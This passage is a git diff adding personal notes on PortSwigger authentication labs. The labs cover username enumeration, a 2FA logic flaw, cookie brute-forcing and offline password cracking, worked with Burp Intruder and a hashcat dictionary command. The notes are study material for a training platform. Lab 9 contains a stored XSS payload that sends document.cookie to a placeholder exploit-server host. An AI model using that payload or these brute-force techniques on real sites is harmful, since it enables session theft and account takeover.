@@ -155,3 +155,101 @@ This lab is vulnerable to username enumeration. It uses account locking, but thi
 8. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.
 
 Analysis:
+
+- invalid username/password --> 'Invalid username or password'
+- valid username/password --> You have made too many incorrect login attempts
+    
+  The result of this configuration in Burp Intruder is that for each username (from the first payload position), the same username will be tested five times due to the **Null payloads** in the second position. The second position doesn’t actually alter the password or other data but adds repetition of login attempts for each username.  
+	![[Pasted image 20241018234604.png]]
+	![[Pasted image 20241018234940.png]]
+
+- filtering&looking for the longest response length (correct username)
+- fuzz password using sniper(grep by 'Invalid username or password' error)
+
+# **7. 2FA broken logic**
+This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page. You also have access to the email server to receive your 2FA verification cod
+- Your credentials: `wiener:peter`
+- Victim's username: `carlos`
+
+1. With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the `POST /login2` request, the `verify` parameter is used to determine which user's account is being accessed.
+2. Log out of your account.
+3. Send the `GET /login2` request to Burp Repeater. Change the value of the `verify` parameter to `carlos` and send the request. This ensures that a temporary 2FA code is generated for Carlos.
+4. Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
+5. Send the `POST /login2` request to Burp Intruder.
+6. In Burp Intruder, set the `verify` parameter to `carlos` and add a payload position to the `mfa-code` parameter. Brute-force the verification code.
+7. Load the 302 response in the browser.
+8. Click **My account** to solve the lab.
+
+Analysis:
+![[Pasted image 20241019002453.png]]
+![[Pasted image 20241019002839.png]]
+
+- in order to trick the server to generate a temporary 2FA for user `carlos` we will modify the `verify` parameter of the GET/login2 request(while we are still logged as wiener)-->carlos.
+![[Pasted image 20241019003549.png]]
+- now we will generate fail attempt on 2FA (POST/login2) and send it to intruder to brute force the temporary generated 2FA code for user carlos
+![[Pasted image 20241019004838.png]]
+
+# **8.  Brute-forcing a stay-logged-in cookie**
+This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
+
+To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.
+
+- Your credentials: `wiener:peter`
+- Victim's username: `carlos`
+- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
+
+1. With Burp running, log in to your own account with the **Stay logged in** option selected. Notice that this sets a `stay-logged-in` cookie.
+2. Examine this cookie in the [Inspector](https://portswigger.net/burp/documentation/desktop/tools/inspector) panel and notice that it is Base64-encoded. Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:
+    `base64(username+':'+md5HashOfPassword)`
+3. Log out of your account.
+4. In the most recent `GET /my-account`, highlight the `stay-logged-in` cookie parameter and send the request to Burp Intruder.
+5. In Burp Intruder, notice that the `stay-logged-in` cookie has been automatically added as a payload position. Add your own password as a single payload.
+6. Under **Payload processing**, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
+    - Hash: `MD5`
+    - Add prefix: `wiener:`
+    - Encode: `Base64-encode`
+7. As the **Update email** button is only displayed when you access the `/my-account` page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the  **Settings** side panel, add a grep match rule to flag any responses containing the string `Update email`. Start the attack.
+8. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
+9. Make the following adjustments and then repeat this attack:
+    - Remove your own password from the payload list and add the list of [candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) instead.
+    - Change the **Add prefix** rule to add `carlos:` instead of `wiener:`.
+10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing `Update email`. The payload from this request is the valid `stay-logged-in` cookie for Carlos's account.
+
+Analysis:
+
+stay-logged-in: base64(username:md5(password))
+![[Pasted image 20241019021103.png]]
+**note:**
+	is recommended to use an offline hash cracking tool as hashcat (not considered data breaching data)
+		`hashcat -a 0 -m 0 file.txt rockyou.txt`
+
+- **`-a 0`**: This specifies the **attack mode**. The value `0` refers to a **dictionary attack**. In a dictionary attack, Hashcat will use each word from a wordlist (in this case, `rockyou.txt`) and attempt to crack the hashes by matching each word against the hash in the `file.txt`.
+- **`-m 0`**: This specifies the **hash type**. The value `0` refers to **MD5** hashes. You are telling Hashcat that the hashes in `file.txt` are using the MD5 algorithm, so it will attempt to crack them as MD5 hashes.
+- **`file.txt`**: This is the file containing the **hashes** you want to crack. Each hash is assumed to be stored on a separate line in this file.
+- **`rockyou.txt`**: This is the **wordlist** file, typically containing a list of common passwords. In this case, the famous **RockYou** password list is being used, which is a large collection of leaked passwords often used in cracking attempts.
+
+
+- we apply the predefined rules discovered on our first request
+	brute-forcing= base64(carlos:md5(X))
+	![[Pasted image 20241019022121.png]]
+
+# **9. Offline password cracking**
+This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
+
+- Your credentials: `wiener:peter`
+- Victim's username: `carlos`
+
+1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
+2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
+    `username+':'+md5HashOfPassword`
+3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
+4. Go to the exploit server and make a note of the URL.
+5. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID:
+    `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
+6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
+7. Decode the cookie in Burp Decoder. The result will be:
+    `carlos:26323c16d5f4dabff3bb136f2460a943`
+8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
+9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
+
+Analysis:
